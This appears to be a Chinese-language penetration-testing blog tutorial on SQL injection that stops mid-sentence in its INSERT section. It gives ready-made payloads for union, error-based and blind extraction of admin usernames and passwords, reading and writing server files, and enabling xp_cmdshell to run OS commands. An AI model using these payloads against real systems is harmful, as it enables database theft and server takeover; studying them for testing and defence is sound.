---
title: SQL注入分类与详解
date: 2018-08-12 20:32:31
tags:
    - 渗透
    - SQL注入
    - 漏洞
categories: 渗透测试
keywords:
description:
---
![](http://image.ixysec.com/image/sql/sqlinjectionlogo.png)
对SQL注入的大概分类总结，和一些基础的利用方法。<!-- more -->

SQL注入是一种通过操纵输入来修改后台SQL语句以达到利用代码进行攻击的技术。

SQL注入产生的危害很多，比如后台用户及密码泄露、会员用户信息泄露、读写文件，甚至可以获得服务器权限。因此，SQL注入也是OWSP TOP 10的常客。

## SQL注入产生原理
攻击者能够控制发送给SQL查询的输入，并且开发者没有对这些输入进行安全检查和过滤直接组合到SQL语句，那么组合后的恶意语句就会被带入数据库执行。

## SQL注入分类
SQL注入的分类很多，不同的人也会将注入分成不同的种类，下面笔者将介绍一下常见的分类。

**注意：此文章中标点符号在页面中显示可能会转成中文的，自己测试时候语句中的标点一律使用英文输入法状态下的。**

### 根据数据库类型分类
每一种数据库都有一种注入命名方式，以下是比较常见的数据库注入方式
#### ACCESS注入
+ 数据库结构

![](http://image.ixysec.com/image/sql/sql001.png)

+ 判断注入
```
and 1=1
and 1=2

```
select * from product where id=1406 and 1=1  //真条件页面正常

![](http://image.ixysec.com/image/sql/sql002.png)

select * from product where id=1406 and 1=2  //假条件返回空

![](http://image.ixysec.com/image/sql/sql003.png)

```
or 1=1
or 1=2
```
select * from product where id=1406 or 1=1   //永真条件会返回数据库中全部结果

![](http://image.ixysec.com/image/sql/sql004.png)
select * from product where id=1406 or 1=2   //1406 or 1=2 返回id等与1406的结果

![](http://image.ixysec.com/image/sql/sql005.png)
具体页面怎么显示还要看代码怎么写的，实战中可能会有所不同。

```
xor 1=1
xor 1=2

逻辑异或。 如果任一操作数为NULL，则返回NULL。 对于非NULL操作数，如果奇数个操作数非零，则求值为1，否则返回0。

a XOR b 等同( a AND (NOT b) ) 或 ( (NOT a) AND b ),就是两个不能同时成立,也不能同时不成立,只成立其中一个条件
```
select * from product where id=1406 xor 1=1
a AND (NOT b)   返回空结果
(NOT a) AND b   返回id不等于1406的所有结果


select * from product where id=1406 xor 1=2
a AND (NOT b)   返回id等于1406的结果
(NOT a) AND b   返回空结果

如果过滤了=号换成“>”或“<”一个道理。
还有简单的方法就是在id参数后加特殊符号，如’ “ \ % *等一切可能使SQL语句报错的字符。

**联合查询法**
猜字段个数
```
order by 22 # 回显正确
```
![](http://image.ixysec.com/image/sql/sql006.png)
```
order by 23 # 回显错误
```
![](http://image.ixysec.com/image/sql/sql007.png)
因此存在22个字段。

说明：这里判断出来的字段是当前页面所连接的表的字段个数而非管理员表字段个数；准确的说是当前页面SQL语句查询的字段个数，例如select * from news猜出的字段数就是news表中所有字段个数，如果select id,title from news猜解出的就只有两个字段；

order by 是按照字段数据进行排序，用法为：order by 字段名，之所以能用来判断字段个数是因为，order by 1 <==> 按第一个字段排序，如果查询结果中一共22个字段order by 23就会出错。

猜表名
```
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
```
UNION是联合查询，将前后两条查询语句的结果组和到一起返回。SELECT后面的数字只是为了占位置，因为两条查询结果字段数不同的话会出错不会正常返回。

![](http://image.ixysec.com/image/sql/sql008.png)

可以看到3和15两个字段的内容被输出到页面中，我们可以通过这两个位置继续查询我们想要的数据并显示。

猜列名并爆数据
```
UNION SELECT 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin
```
admin和password是admin表中的字段名，ACCESS数据库只能靠暴力猜解。

![](http://image.ixysec.com/image/sql/sql009.png)

爆出所有用户
```
UNION SELECT top 1 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin where not id=1
```

**逐字猜解法(盲注)**
注入检测
同上面的方法一样

猜表名
```
and exists (select * from 表名)
```
![](http://image.ixysec.com/image/sql/sql010.png)

![](http://image.ixysec.com/image/sql/sql011.png)

猜列名
```
and exists (select 列名 from 表名)
```
![](http://image.ixysec.com/image/sql/sql012.png)

获取数据长度
```
and (select top 1 len(列名) from 表名)>5
```
and (select top 1 len(password) from admin)>16//错误
and (select top 1 len(password) from admin)>15//正常
说明password字段内容的长度是16

获取指定位数的数据
```
and (select top 1 asc(mid(列名,位置,1)) from 表名)>=97
```
mid(字符串,截取的位置,截取字符数)
asc(） //将字符转换成ascii码  方便进行比较

and (select top 1 asc(mid(admin,1,1)) from admin)>96//判断admin字段的内容第一位的ascii码值大于96   正常

![](http://image.ixysec.com/image/sql/sql013.png)

and (select top 1 asc(mid(admin,1,1)) from admin)>97//判断admin字段的内容第一位的ascii码值大于97   错误 说明就是97

![](http://image.ixysec.com/image/sql/sql014.png)

依次猜解其他位数

盲注的核心
盲注的核心其实是用字符串截取函数一位一位的截取数据，之后把截取到的数据用字符转ascii函数转换成ascii码和数字进行对比，之后将ascii码还原成字符。

#### MySQL注入
MySQL数据库结构

```
MySQL
    数据库a：
        表1：
            字段
                数据
            字段
                数据
        表2：
            字段
                数据
            字段
                数据
    数据库b：
        表1：
            字段
                数据
            字段
                数据
        表2：
            字段
                数据
            字段
                数据
    ......
    
mysql：MySQL自带的一个数据库，用于存放MySQL的一些信息，常用到的是该库下的user表，表中存放着MySQL的用户名和密码以及一些权限信息；低权限用户无法访问该表。

information_schema：MySQL5.0版本以上自带的一个数据库，用于存放所有数据库的库名、表名、字段名访问权限等信息。
information_schema.schemata存放库名的表
information_schema.tables存放表名的表
information_schema.columns存放字段名的表

下面查询信息用到的table_schema、table_name、column_name都是这三个表中的字段名。
table_schema：数据库名
table_name：表名
column_name：字段名

MySQL最高权限用户是root
```

判断注入
```
and 1=1  (and 1)
and 1=2  (and 0)

or 1=1   (or 1)
or 1=2   (or 0)

xor 1=1  (xor 1)
xor 1=2  (xor 0)

like

特殊符号：' " \ %等
```

猜字段个数
```
order by n
```

查信息
爆显位不同于ACCESS，MySQL爆显位不需要接from子句，但ACCESS要接from子句才可以。

![](http://image.ixysec.com/image/sql/sql015.png)

可查的信息有：
```
system_user() 系统用户名
user() 用户名
current_user 当前用户名
session_user()连接数据库的用户名
database() 数据库名
version() MYSQL数据库版本
@@datadir 读取数据库路径
@@basedir MYSQL 安装路径
@@version_compile_os 操作系统
```

![](http://image.ixysec.com/image/sql/sql016.png)

查所有数据库名
```
union select group_concat(schema_name),2,3 from information_schema.schemata
```

![](http://image.ixysec.com/image/sql/sql017.png)

查表名
```
union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()
```
这里的table_schema的值是要查询数据库名，可以用：
```
双引号(单引号)引住明文
明文的16进制字符
database()函数
char(明文的ascii)
```

![](http://image.ixysec.com/image/sql/sql018.png)

查列名

```
union select group_concat(column_name),2,3 from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)  //table_name代表要查询的表名
```

![](http://image.ixysec.com/image/sql/sql019.png)

查数据

```
union select username,password,3 from admin
```

![](http://image.ixysec.com/image/sql/sql020.png)

常见问题：
```
1.无法爆出显位，在id前面加上"-"使其报错
这个问题一般是因为返回了多条结果但是代码页面只显示了原本的一条查询结果，所以让原来的查询返回一个空就会把我们的结果显示出来了。
2.注入多个用户的数据 limit i,1
limit可以控制从指定的行显示
3.注入所有表或列，使用group_concat、concat、concat_ws函数
利用一些MySQL自带的功能函数
5.程序SQL语句中已有order by，一般程序SQL语句中的order by会在可控点之后，那么我们想要使用order by语句判断列数，就要将后面的语句注释掉(e.g. order by 10 %23)
```
小技巧：NULL填充判断列数
有时候order by 无法使用的时候，可以使用NULL填充法判断列数，攻击者可以构造payload：
```
UNION SELECT NULL,NULL,...,NULL
```
直到页面回显正确，页面回显正确的时候的NULL的个数即是列的数量，确定列的数量以后的注入方法和上面介绍的确定列数量以后的注入方法一致。


#### MSSQL注入
MSSQL数据库结构
```
MSSQL
    数据库a
        表1
            字段
                数据
            字段
                数据
        表2
            字段
                数据
            字段
                数据
    数据库b
        表1
            字段
                数据
            字段
                数据
        表2
            字段
                数据
            字段
                数据
    ......
    
    master：系统自带库，记录所有系统信息，登陆，系统设置，初始化信息，其他系统数据库及用户的信息。
    sysdatabases：系统表，保存在master库中，保存了，所有的库名,以及库的ID，和一些相关信息。对我们比较有用的字段名name表示库的名字  dbid表示库的ID   //select  *  from  master.dbo.sysdatabases  就可以查询出所有的库名
    sysobjects：系统表，每个库中都有，在数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在表中占一行。当然数据库表名也在里面的。对我们比较有用的字段名name对象名  id对象ID  xtype对象类型  uid对象所有者的用户id。对象类型(xtype)有很多，我们这里只用得到xtype='U'的值。当等于U的时候，对象名就是表名，对象ID就是表的ID值.   //select * from sqlin.dbo.sysobjects where xtype='U'  这样就可以列出sqlin库中所有的表名
    syscolumns：系统表，每个库中都有，每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。这个就是列出一个表中所有的字段列表的系统表。对我们比较有用的字段名name字段名称    id所属表ID号   colid字段ID号。其中的ID是上面我们用sysobjects得到的表的ID号。    //select * from sqlin.dbo.syscolumns where id=123456789  得到sqlin这个库中，表的ID是123456789中的所有字段列表
    
MSSQL2005及更高版本中以上系统表都变成视图了，但不影响我们的查询。
```

判断注入方法同上

猜解字段数
```
order by n   //原理同上面一样
union all select null,null,null.......    //推荐    有些特殊字段类型不能进行order by排序 即使存在也会报错
```
不能使用order by的时候使用：
```
union all select null,null,null.......
select后面加null，直到返回正常，多少个null就代表多少个字段，因为联合查询的前后结果字段数要相同，上面也有讲到。
union和select直接要加all，因为默认会有一个DISTINCT去重的操作，一些特殊字段类型可能会报错，所以要加all。
union联合查询结果的前后对应列的数据类型必须是相互兼容的，所以这里使用null占位，
```

![](http://image.ixysec.com/image/sql/sql022.png)

![](http://image.ixysec.com/image/sql/sql021.png)

匹配数据类型
我们想要获取信息，至少需要一个数据类型为字符串的列以便通过它来存储并返回我们想要的数据。
```
union all select 'test',null,null
union all select null,'test',null
union all select null,null,'test'
......
```
只需一次一列的使用示例字符串替换null即可，页面返回正常则当前列名支持字符串。

![](http://image.ixysec.com/image/sql/sql023.png)

我表中第一列是int类型所以报错了，因为我开启了详细错误方便调试，所以直接把错误信息显示了出来，实战中返回的信息可能各不相同。关于报错注入在后面其他类型的注入中会讲到。

![](http://image.ixysec.com/image/sql/sql024.png)

查询版本，当前数据库，用户等信息
```
版本：@@version
当前用户：
    system_user
    suser_sname()
    user
当前数据库:db_name()
```
![](http://image.ixysec.com/image/sql/sql025.png)

爆所有数据库
```
union all select null,name,null from master.dbo.sysdatabases
union all select null,'|'%2bname%2b'|',null from master.dbo.sysobjects where xtype='U' for xml path('')
```
利用SQL的FOR XML PATH 参数来进行字符串拼接，可以将结果拼接成一条显示，因为实战中的页面代码可能只允许显示一条并不是循环显示。
![](http://image.ixysec.com/image/sql/sql028.png)

![](http://image.ixysec.com/image/sql/sql029.png)
查询当前数据库所有表名
```
union all select null,(select top 1 name from sysobjects where xtype='U'),null
union all select null,(select '|'%2bname%2b'|' from sysobjects where xtype='U' FOR XML PATH('')),null
union all select null,(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH('')),null
```
union all select null,(select top 1 name from sysobjects where xtype='U'),null
![](http://image.ixysec.com/image/sql/sql026.png)
爆出表名news，在后面加条件and name!='news'就可以爆出不包含news的下一个表
union all select null,(select top 1 name from sysobjects where xtype='U' and name!='news'),null

![](http://image.ixysec.com/image/sql/sql027.png)

然后继续在后面加条件and name!='admin'
```
以此类推可以列举出所有的表
union all select null,(select top 1 name from sysobjects where xtype='U' and name!='news' and name!='admin'),null
```

同样也可以利用FOR XML PATH
```
union all select null,(select '|'%2bname%2b'|' from sysobjects where xtype='U' FOR XML PATH('')),null
```
![](http://image.ixysec.com/image/sql/sql030.png)

 查询字段名
 
```
union all select null,(select id from sysobjects where xtype='U' and name='admin' FOR XML PATH('')),null  //先查询表名admin的ID
union all select null,(select '|'%2bname%2b'|' from syscolumns where id=53575229 FOR XML PATH('')),null  //查询id等于53575229的字段名，53575229是上面查到的所属表的id
```

![](http://image.ixysec.com/image/sql/sql031.png)

![](http://image.ixysec.com/image/sql/sql032.png)

查询数据
```
union all select null,(select '|'%2busername%2b'|'%2bpassword%2b'|' from admin FOR XML PATH('')),null
```

![](http://image.ixysec.com/image/sql/sql033.png)

#### Oracle注入
不熟悉，先挖个坑。。。

### 根据注入点权限划分
#### 普通权限注入
普通权限注入是指所有使用低权限用户连接数据库的注入点，普通权限注入分为两类：
```
1.非root(sa、dba)用户
2.降权后的root、sa、dba
```
普通权限的注入点利用方法很有限，只能对数据库进行增删改查，而不具有跨库查询、文件操作等权限。

#### 高权限注入
高权限注入是指所有使用高权限用户(root、sa、dba)连接数据库的注入点。高权限的注入点利用方式很多，不仅限于增删改查，一般还具有读写文件的权限(特殊情况后面介绍)和存储扩展的调用权限。

高权限的注入点产生的危害，包括但不仅限于：
```
1.获取数据库中的数据
2.读写文件，读取文件和写shell
3.调用存储扩展获取系统权限(MSSQL)
```

影响读写文件的因素：
```
1.是否拥有file权限
2.secure_file_priv选项
```
secure_file_priv选项请参考：[MYSQL新特性限制文件写入及替代方法](http://www.ixysec.com/MYSQL%E6%96%B0%E7%89%B9%E6%80%A7%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8F%8A%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95.html)


MySQL读文件
关于获取绝对路径的方法有机会在其他文章讲解。
```
union select 1,load_file('D:\\phpStudy\\WWW\\sqlin\\sqltest.php'),3
```
![](http://image.ixysec.com/image/sql/sql035.png)

路径注意点：
```
1.路径使用\\ ，否则会被当作转义符号
2.路径使用/
3.盘符根路径下可用c:admin.txt
4.路径转换成16进制，不需要加单引号
5.char(路径ascii)
```

MySQL写文件
```
union select 1,'<?php phpinfo();?>',3 into outfile 'D:\\phpStudy\\WWW\\sqlin\\qqq.php'
```
![](http://image.ixysec.com/image/sql/sql036.png)

SQLMAP的os-shell 与 sql-shell

--sql-shell获取一个sqlShell用于执行SQL命令。

![](http://image.ixysec.com/image/sql/sql037.png)

-–os-shell获取一个cmdShell，用于执行cmd命令，对于MSSQL该选项是调用xp..cmdshell存储扩展进行执行命令的;对于MySQL该选项是通过into outfile写入shell,然后再执行命令的,因此对于MySQL需要绝对路径

![](http://image.ixysec.com/image/sql/sql038.png)
对于MySQL os-shell写入的两个马儿说明：第一个是一个小马(上传文件用)；第二个是一个一句话，密码为cmd


MSSQL调用xp..cmdshell执行命令
```
;exec master..xp_cmdshell 'whoami';--
```
![](http://image.ixysec.com/image/sql/sql039.png)

可以使用如下命令来启用xp_cmdshell
```
;EXEC sp_configure 'show advanced options',1;    //允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;    //打开xp_cmdshell扩展
RECONFIGURE;--
```
![](http://image.ixysec.com/image/sql/sql040.png)

![](http://image.ixysec.com/image/sql/sql041.png)

也可以直接导出一句话木马，需要获取绝对路径。
system权限，这个权限是根据启动MSSQL服务的账户权限而定的。

![](http://image.ixysec.com/image/sql/sql042.png)


这种直接在注入点后以;号分割多条SQL语句执行叫做  堆叠查询，这种方式为攻击者提供了更多自由和可能。
遗憾的是，并非所有数据库服务器平台都支持堆叠查询。例如，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时，PHP允许堆叠查询；但如果访问MySQL，PHP不允许堆叠查询。


### 根据页面回显不同分类
#### 普通注入
  前面介绍到的那些有回显的注入，就是这里所说的普通注入，因为它们无论是以什么提交方式进行注入的，无论是什么数据库，无论执行的SQL语句是什么，它们都有一个共同的特点，那就是有正常回显。
  
#### 报错注入
报错注入是利用数据库的一些函数和特性，利用报错将想要的信息或数据夹在报错信息中显示出来。

##### MySQL报错注入
Mysql报错注入有一个限制条件：
```
echo  "<br>".mysql_error();
```
只有将SQL语句执行的错误信息打印出来才可以看到报错，所以报错注入需要程序能够打印SQL语句执行错误信息。

MySQL中能够用在报错注入的函数有：
```
count()、rand()、group by
updatexml()
extractvalue()
geometrycollection()
multipoint()
polygon()
multipolygon()
linestring()
multilinestring()
exp()
等等
```
这里我只讲前三种，其他函数的具体用法自行百度或者查询MySQL手册。

利用count()、rand()、group by报错注入

关于这三个组合就能报错的原理请看：[Mysql报错注入原理分析（count()、rand()、group by）](http://www.ixysec.com/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88count%E3%80%81rand%E3%80%81group-by%EF%BC%89.html)

payload：
```
and (select 1 from((select count(*),(concat(user(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x))a)  //查询当前数据库用户
```
![](http://image.ixysec.com/image/sql/sql065.png)

下面我们来拆分解读一下这个语句。
核心：
```
select count(*),(concat(user(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x
```
concat()是连接字符串的，将参数连接到一起
这条语句直接复制到数据库里执行就可以爆出用户名，具体原理看上面的文章。

因为and后面不能直接跟select语句，所以只能包在（）中作为子查询；又因为and后面操作数的结果只能包含一列，所以将报错语句包含在`and (select 1 from ()a)`的()中作为这条语句的子查询才能够正常报错返回结果。

查询数据库名
```
and (select 1 from(select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)
```
![](http://image.ixysec.com/image/sql/sql066.png)

查询表名
```
and (select 1 from(select count(*),(concat((select table_name from information_schema.tables where table_schema=0x73716C696E limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)   //查询第一条表名
```
其实就是把查询库名的database()的地方换成又一条子查询语句来查询表名，由于concat的参数一次只接收一个结果，所以利用`limit`子句控制只显示一条。只需要更改 limit 1,1 便可显示下一条，以此类推可以遍历出所有表名。

![](http://image.ixysec.com/image/sql/sql067.png)

查询字段名

```
and (select 1 from(select count(*),(concat((select column_name from information_schema.columns where table_name=0x61646D696E limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)
```
想遍历所有字段名方法同上，只需更改limit子句的值。
![](http://image.ixysec.com/image/sql/sql068.png)

查询数据

```
and (select 1 from(select count(*),(concat((select username from admin limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)  //查询数据时是从刚刚查到的表中去查，from后面直接跟表名就行了
```
查询其他字段的内容只需更改字段名，同样修改limit子句可遍历多条。

![](http://image.ixysec.com/image/sql/sql069.png)


利用UPDATEXML函数报错注入：

```
UPDATEXML (XML_document, XPath_string, new_value);
第一个参数：XML_document是String格式，为XML文档对象的名称
第二个参数：XPath_string (Xpath格式的字符串)
第三个参数：new_value，String格式，替换查找到的符合条件的数据
```

查询信息：
```
and updatexml(0,concat(0x7c,version()),1)  //查询数据库版本
and updatexml(0,concat(0x7c,user()),1)  //查询当前数据库用户
and updatexml(0,concat(0x7c,database()),1)  //查询当前使用数据库名
因为第二个参数给的并不是标准的Xpath，所以会引发报错。
```

查询表名
```
and updatexml(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x73716C696E)),1)  //实战中要注意括号的嵌套。
```
![](http://image.ixysec.com/image/sql/sql070.png)

查询字段名

```
and updatexml(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E)),1)
```

![](http://image.ixysec.com/image/sql/sql071.png)

查询数据

```
and updatexml(0,concat(0x7c,(select group_concat(username) from admin)),1)   //admin是查询到的表名，username是上面查到的字段名
and updatexml(0,concat(0x7c,(select concat(username,0x7c,password) from admin limit 0,1)),1)   //利用concat()将两列内容拼接成一列显示，如果表中有多条数据需要使用limit一次遍历一条
```

![](http://image.ixysec.com/image/sql/sql072.png)

![](http://image.ixysec.com/image/sql/sql073.png)

利用EXTRACTVALUE函数报错注入：

payload：
```
and EXTRACTVALUE(0,concat(0x7c,version())) //查版本

and EXTRACTVALUE(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema = database()))) //查表名

and EXTRACTVALUE(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name='admin')))   //查字段名

and EXTRACTVALUE(0,concat(0x7c,(select concat(username,0x7c,password) from admin limit 0,1)))  //查数据
```

**一个问题：**
updatexml 和 EXTRACTVALUE函数都只能爆出32位数据，如果要爆出32位以后的数据，需要借助mid函数来进行字符截取从而显示32位以后的数据。
```
mid(string,start,[length])
```
![](http://image.ixysec.com/image/sql/sql074.png)

```
and EXTRACTVALUE(0,concat(0x7e,mid(concat(0x7c,(select concat(username,0x7c,password) from admin limit 1,1)),33),0x7e))
```
产生错误的语句是`concat(0x7c,(select concat(username,0x7c,password) from admin limit 1,1)`
用mid(）包起来从第33位开始显示剩余的，测试剩余的字符串有可能不会引起报错，所以在外面用concat(）又包了一层，头尾拼接了~符号，0x7c是~符号的16进制。

![](http://image.ixysec.com/image/sql/sql075.png)

##### MSSQL报错注入

MSSQL报错注入前提条件需要开启显示详细错误：web.config文件设置
```
<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
</configuration>
```

原理是利用MSSQL数据库的类型转换，将一些内容转换为数字时引发错误并将这些内容显示出来。

查信息：
```
and 1=(select @@VERSION)     //MSSQL版本
and 1=(select db_name())     //当前数据库名
and 1=(select @@servername)    //本地服务名
and 1=(select IS_SRVROLEMEMBER('sysadmin'))   //判断是否是系统管理员
and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')     //判断XP_CMDSHELL是否存在
```

![](http://image.ixysec.com/image/sql/sql076.png)

也可以用`1/@@VERSION`，因为`/`是做除法运算，所以会将后面的数据尝试转换为int类型，同样也会产生错误。

![](http://image.ixysec.com/image/sql/sql077.png)

查询表名：
```
and 1=(select '|'%2bname%2b'|' from sqlin..sysobjects where xtype='U' FOR XML PATH(''))--   //sqlin是查询的数据库
and 1=(select quotename(name) from sqlin..sysobjects where xtype='U' FOR XML PATH(''))--  
```

![](http://image.ixysec.com/image/sql/sql078.png)

查询字段名：
```
and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))-- 
and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--
```
因为查询字段名要根据所属表名的id来查，所以用了一个子查询查出表名的id。

![](http://image.ixysec.com/image/sql/sql079.png)

查询内容：
```
逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：
    and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(''))--
一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：
    and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--
```
![](http://image.ixysec.com/image/sql/sql080.png)


#### 盲注-基于布尔的盲注

在一些站点隐藏了错误信息的情况下，联合查询以及报错注入的方法均无法注入出数据的时候，需要用到盲注的方法来进行注入。

基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面

基于布尔盲注的过程：
判断盲注
```
and 1=1 
and 1=2
```
返回页面不相同。

![](http://image.ixysec.com/image/sql/sql081.png)

猜解当前数据库用户名

第一步：判断当前数据库用户名的长度(以便逐位猜解用户名)

```
and (select length(user()))=长度   //也可以使用大于号>、小于号< 更快的判断
```
![](http://image.ixysec.com/image/sql/sql082.png)

第二步：逐位猜解当前数据库用户名

```
and (select ascii(substr(user(),位数,1)))=ascii码   //substr()是字符串截取函数  substr('abc',2,1)的结果是'b'   ascii()返回字符的ascii码值
```

![](http://image.ixysec.com/image/sql/sql083.png)

判断用户名的第一位ascii码为114，而114代表的就是小写字母`r`。
![](http://image.ixysec.com/image/sql/sql084.png)

依次猜解其他位数字符的ascii码，最后对照表还原成字符。

猜解当前数据库名
第一步：判断当前数据库的长度(以便逐位猜解数据库名)

```
and (select length(database()))=长度
```
![](http://image.ixysec.com/image/sql/sql085.png)

第二步：逐位猜解数据库名
```
and (select ascii(substr(database(),位数,1)))=ascii码
```
![](http://image.ixysec.com/image/sql/sql086.png)

猜解表名
第一步：判断表名的数量(以便逐个判断表名长度)
```
and (select count(table_name) from information_schema.tables where table_schema=database())=数量
```
![](http://image.ixysec.com/image/sql/sql087.png)

第二步：判断某个表的长度(以便逐位猜解表名)
```
and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度    //通过limit控制判断的是第几个表
```
![](http://image.ixysec.com/image/sql/sql088.png)

第三步：逐位猜解表名
```
and (select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码
```
![](http://image.ixysec.com/image/sql/sql089.png)

猜解列名
第一步：判断列名的数量(以便逐个判断列名长度)
```
and (select count(column_name) from information_schema.columns where table_name='表名')=数量
```
![](http://image.ixysec.com/image/sql/sql090.png)

第二步：判断某个列的长度(以便逐位猜解列名)
```
and (select length(column_name) from information_schema.columns where table_name='表名' limit n,1)=长度
```
![](http://image.ixysec.com/image/sql/sql091.png)

第三步：逐位猜解列名
```
and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name='表名' limit n,1)=ascii码
```
![](http://image.ixysec.com/image/sql/sql092.png)

猜数据
第一步：判断数据的数量(以便逐个判断数据长度)
```
and (select count(username) from admin)=数量   //admin是查到的表名，username是admin表中的字段名
```
![](http://image.ixysec.com/image/sql/sql093.png)

第二步：判断某条数据的长度(以便逐位猜解数据)
```
and (select length(username) from admin limit n,1)=长度
```
![](http://image.ixysec.com/image/sql/sql094.png)

第三步：逐位猜解数据
```
and (select ascii(substr(username,位数,1)) from admin limit n,1)=ascii码
```
![](http://image.ixysec.com/image/sql/sql095.png)

**基于布尔盲注的实质：**
```
and (SQL语句)=数字 ，页面正确则结果为该数字，否则不是
```


#### 盲注-基于时间的盲注

基于布尔的盲注和基于时间的盲注不同，前者是通过页面差来判断是否存在注入以及数据注入的;后者无法得到页面差(比如：无论输入什么都得到同一个页面),而它只能通过SQL语句执行的时间来判断注入以及数据注入.

常见无界面差的情况：
1. 无论输入什么都只显示无信息页面，例如登陆页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况下也不知道。在这种情况下，有可能基于时间的SQL注入会有效。
2. 无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面。采集用户的 IP、浏览器类型、refer字段、session字段，无论用户输入什么，都显示正常页面。

注入过程：
判断基于时间的盲注
```
and if(1=1,sleep(5),1)
and if(1=2,sleep(5),1)
if(条件,True返回内容,False返回内容)用来进行判断，sleep()延时函数，单位秒。
```
![](http://image.ixysec.com/image/sql/sql096.png)

如上图所示，当if判断为真时，则会延时5s(如果文件中通过localhost连接数据库会延时5+1=6秒)；而if判断为假时，则不延时。

猜解当前数据库用户名
第一步：猜解用户名的长度。(猜解到的用户名长度用于下面的逐位猜解用户名)
```
and if((select length(user()))=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql097.png)

第二步：逐位猜解用户名。
```
and if((select ascii(substr(user(),位数,1))=ascii码),sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql098.png)

猜解当前数据库名
第一步：猜解数据库名的长度。
```
and if((select length(database()))=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql099.png)

第二步：猜解数据库名。
```
and if((select ascii(substr(database(),位数,1))=ascii码),sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql100.png)

猜表名
第一步：判断表名的数量(以便逐个猜表名)
```
and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql101.png)

第二步：判断某个表名的长度(以便逐位猜表名的数据)
```
and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql102.png)

第三步：逐位猜表名
```
and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql103.png)

猜列名
第一步：判断列名的数量(以便逐个猜列名)
```
and if((select count(column_name) from information_schema.columns where table_name='表名')=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql104.png)

第二步：判断某个列名的长度(以便逐位猜列名的数据)
```
and if((select length(column_name) from information_schema.columns where table_name='表名' limit n,1)=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql105.png)

第三步：逐位猜列名
```
and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name='表名' limit n,1)=ascii码,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql106.png)

猜数据
第一步：判断数据的数量(以便逐个猜数据)
```
and if((select count(列名) from 表名)=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql107.png)

第二步：判断某个数据的长度(以便逐位猜数据)
```
and if((select length(username) from admin limit 0,1)=5,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql108.png)

第三步：逐位猜数据
```
and if((select ascii(substr(username,1,1)) from admin limit 0,1)=97,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql109.png)

**基于时间的盲注实质：**
```
if(布尔盲注语句,sleep(5),1)
```

### 根据程序SQL语句分类
后台执行的SQL语句，不仅有select一种，还有INSERT、UPDATE、DELETE等。语句不同，注入的方法也就不一样了,下面我们就来介绍一下其他语句的注入方法。

#### INSERT注入
##### 检测方法
方法1：
第一步：在数据提交点，插入**英文输入法**状态下的**单引号**，如果数据插入失败，那么80%是注入，20%是拦截。

原因：
```
